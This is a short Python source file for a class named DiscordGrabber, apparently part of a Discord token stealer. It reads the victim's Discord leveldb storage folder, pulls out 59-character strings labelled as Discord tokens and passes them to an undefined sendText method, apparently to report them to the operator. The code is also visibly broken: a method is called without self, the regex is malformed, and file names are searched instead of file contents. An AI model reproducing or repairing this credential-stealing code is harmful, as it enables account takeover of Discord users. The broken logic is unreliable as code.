import re
import os
import requests

class DiscordGrabber:

    def get(self):
        files = SearchForFile()
        if not files:
            self.sendText("⛔ Didn't find any ldb files")
            return
        for token in files:
            matches = re.findall(r'(?<=⛔).*?(?=\))', token)
            for match in matches:
                if len(match) == 59:
                    self.sendText("💎 Discord token: " + match)

    def SearchForFile(self):
        discord_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'discord', 'Local Storage', 'leveldb', '')
        if not os.path.exists(discord_path):
            self.sendText("🛠 Discord path not found")
            return []

        ldb_files = []
        for file in os.listdir(discord_path):
            if file.endswith('.ldb'):
                ldb_files.append(file)

        return ldb_files

